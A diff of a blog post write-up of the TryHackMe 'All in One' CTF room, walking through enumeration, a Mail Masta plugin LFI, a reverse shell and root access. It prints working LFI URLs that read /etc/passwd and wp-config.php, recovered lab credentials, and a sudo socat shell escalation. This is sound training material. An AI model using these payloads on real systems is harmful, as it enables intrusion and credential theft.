@@ -6,7 +6,7 @@ categories:
   - TryHackMe
 ---
 
-<img src="aio.png" width=200 alt="all-in-one">
+{{< post-img src="aio.png" alt="all-in-one" style="width:200px" >}}
 
 I like the concept of this machine alot. many ways to exploit
 
@@ -14,14 +14,12 @@ Like sometimes it do be like that IRL
 
 ## Enumeration
 
-### nmap
-
-```
+```bash
 PORT   STATE SERVICE REASON  VERSION
 21/tcp open  ftp     syn-ack vsftpd 3.0.3
 |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
-| ftp-syst: 
-|   STAT: 
+| ftp-syst:
+|   STAT:
 | FTP server status:
 |      Connected to ::ffff:10.8.226.203
 |      Logged in as ftp
@@ -35,7 +33,7 @@ PORT   STATE SERVICE REASON  VERSION
 |_End of status
 
 22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 e2:5c:33:22:76:5c:93:66:cd:96:9c:16:6a:b3:17:a4 (RSA)
 | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLcG2O5LS7paG07xeOB/4E66h0/DIMR/keWMhbTxlA2cfzaDhYknqxCDdYBc9V3+K7iwduXT9jTFTX0C3NIKsVVYcsLxz6eFX3kUyZjnzxxaURPekEQ0BejITQuJRUz9hghT8IjAnQSTPeA+qBIB7AB+bCD39dgyta5laQcrlo0vebY70Y7FMODJlx4YGgnLce6j+PQjE8dz4oiDmrmBd/BBa9FxLj1bGobjB4CX323sEaXLj9XWkSKbc/49zGX7rhLWcUcy23gHwEHVfPdjkCGPr6oiYj5u6OamBuV/A6hFamq27+hQNh8GgiXSgdgGn/8IZFHZQrnh14WmO8xXW5
 |   256 1b:6a:36:e1:8e:b4:96:5e:c6:ef:0d:91:37:58:59:b6 (ECDSA)
@@ -44,7 +42,7 @@ PORT   STATE SERVICE REASON  VERSION
 |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAOG6ExdDNH+xAyzd4w1G4E9sCfiiooQhmebQX6nIcH/
 
 80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
-| http-methods: 
+| http-methods:
 |_  Supported Methods: OPTIONS HEAD GET POST
 |_http-title: Apache2 Ubuntu Default Page: It works
 |_http-server-header: Apache/2.4.29 (Ubuntu)
@@ -53,9 +51,7 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 hmm...Expected more open ports
 
-## Gobuster
-
-```
+```bash
 /.hta                 (Status: 403) [Size: 276]
 /.htpasswd            (Status: 403) [Size: 276]
 /.htaccess            (Status: 403) [Size: 276]
@@ -63,13 +59,12 @@ hmm...Expected more open ports
 /server-status        (Status: 403) [Size: 276]
 /wordpress            (Status: 301) [Size: 314] [--> http://10.10.148.7/wordpress/]
 
-
 ```
 
 ah yes the ftp folder is empty!
 
 
-```
+```bash
 └──╼ $ftp 10.10.148.7
 Connected to 10.10.148.7.
 220 (vsFTPd 3.0.3)
@@ -91,12 +86,12 @@ ftp> ls -al
 drwxr-xr-x    2 0        115          4096 Oct 06  2020 .
 drwxr-xr-x    2 0        115          4096 Oct 06  2020 ..
 226 Directory send OK.
-ftp> 
+ftp>
 ```
 Let's check that "wordpress" first
 
 
-```
+```bash
 /.hta                 (Status: 403) [Size: 276]
 /.htpasswd            (Status: 403) [Size: 276]
 /.htaccess            (Status: 403) [Size: 276]
@@ -109,7 +104,7 @@ Let's check that "wordpress" first
 
 Yeah I will just use wpscan to win some time
 
-```
+```bash
 ...
 
 [+] Upload directory has listing enabled: http://10.10.148.7/wordpress/wp-content/uploads/
@@ -176,7 +171,7 @@ Even trying to bruteforce the password did not help me
 
 But we got 2 plugins and wordpress is famous for its plugins security policy
 
-```
+```bash
 └──╼ $searchsploit mail masta
 
  Exploit                                       Title        |  Path
@@ -196,17 +191,16 @@ Guess what? we gonna exploit mail masta
 I chose the LFI way for it is faster
 
 
-
-```
+```bash
 http://10.10.230.184/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
 ```
 LFI is usually for reading those config files for creds
 
-```
+```bash
 http://10.10.230.184/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php
 ```
 
-```
+```php
 // ** MySQL settings - You can get this info from your web host ** //
 /** The name of the database for WordPress */
 define( 'DB_NAME', 'wordpress' );
@@ -221,18 +215,14 @@ define( 'DB_PASSWORD', 'H@ckme@123' );
 define( 'DB_HOST', 'localhost' );
 
 ...
-
 ```
 
 If you tried to ssh with those I am so sorry
-
 there is more job to do as it seems
-
-Upload a classic reverse shell in theme editor 
-
+Upload a classic reverse shell in theme editor
 or use a plugin...anyway you want, get a shell
 
-```
+```bash
 └──╼ $nc -lnvp 4444
 listening on [any] 4444 ...
 connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 33828
@@ -242,12 +232,12 @@ USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 /bin/sh: 0: can't access tty; job control turned off
 $ python3 -c 'import pty;pty.spawn("/bin/bash")'
-bash-4.4$ 
+bash-4.4$
 
 ```
-Back to business! 
+Back to business!
 
-```
+```bash
 bash-4.4$ ls -al
 ls -al
 total 48
@@ -275,7 +265,7 @@ Elyana's user password is hidden in the system. Find it ;)
 ```
 nieh!
 
-```
+```bash
 bash-4.4$ find / -user elyana 2>/dev/null
 find / -user elyana 2>/dev/null
 /home/elyana
@@ -292,7 +282,7 @@ find / -user elyana 2>/dev/null
 /home/elyana/.bashrc
 /etc/mysql/conf.d/private.txt
 
-bash-4.4$ cat /etc/mysql/conf.d/private.txt             
+bash-4.4$ cat /etc/mysql/conf.d/private.txt
 cat /etc/mysql/conf.d/private.txt
 user: elyana
 password: E@syR18ght
@@ -300,10 +290,9 @@ password: E@syR18ght
 ```
 
 ah yes I love using find...its my favorite command
-
 that was an extra step but hey now we got ssh too
 
-```
+```bash
 su elyana
 Password: E@syR18ght
 
@@ -321,7 +310,7 @@ Decode the flag to get it to the right format
 
 The classics
 
-```
+```bash
 bash-4.4$ sudo -l
 sudo -l
 Matching Defaults entries for elyana on elyana:
@@ -330,9 +319,8 @@ Matching Defaults entries for elyana on elyana:
 
 User elyana may run the following commands on elyana:
     (ALL) NOPASSWD: /usr/bin/socat
-
 ```
-```
+```bash
 bash-4.4$ find / -perm -u=s 2>/dev/null
 find / -perm -u=s 2>/dev/null
 /bin/mount
@@ -366,7 +354,7 @@ socat acting very sus right now
 
 But look there is also pkexec/lxc
 
-```
+```bash
 bash-4.4$ id
 id
 uid=1000(elyana) gid=1000(elyana) groups=1000(elyana),4(adm),27(sudo),108(lxd)
@@ -374,14 +362,11 @@ uid=1000(elyana) gid=1000(elyana) groups=1000(elyana),4(adm),27(sudo),108(lxd)
 yup I see at least two ways
 
 I already did the lxd method...like twice so I wont bother this time
-
 you should try its very fun (use alpine-builder for the image)
-
-I ask gtfobins how to make socat behave 
-
+I ask gtfobins how to make socat behave
 you would not believe how easy the answer was
 
-```
+```bash
 bash-4.4$ sudo socat stdin exec:/bin/sh
 sudo socat stdin exec:/bin/sh
 id
@@ -392,13 +377,13 @@ One-line superpowers
 
 Get the stuff
 
-```
+```bash
 cd /root
 ls
 cd /root
 ls
 root.txt
-cat root.txt 
+cat root.txt
 cat root.txt
 YW5vdGhlciBmYWtlIGZsYWcgZm9yIGZvb2xz
 
@@ -406,16 +391,10 @@ YW5vdGhlciBmYWtlIGZsYWcgZm9yIGZvb2xz
 Decode the flag and its done
 
 I have to admit I feel a bit disappointed...I expected "many ways to exploit"
-
 But it still felt very linear...Still a nice room
-
 But I expected many cheese holes
-
 It was more like 2 or 3 ways to escalate and get root
-
 Maybe its me just being stupid and not finding other ways
-
 I will explore it a bit more later (or just read writeups to see how others did it)
 
 Overall a nice easy room!
-
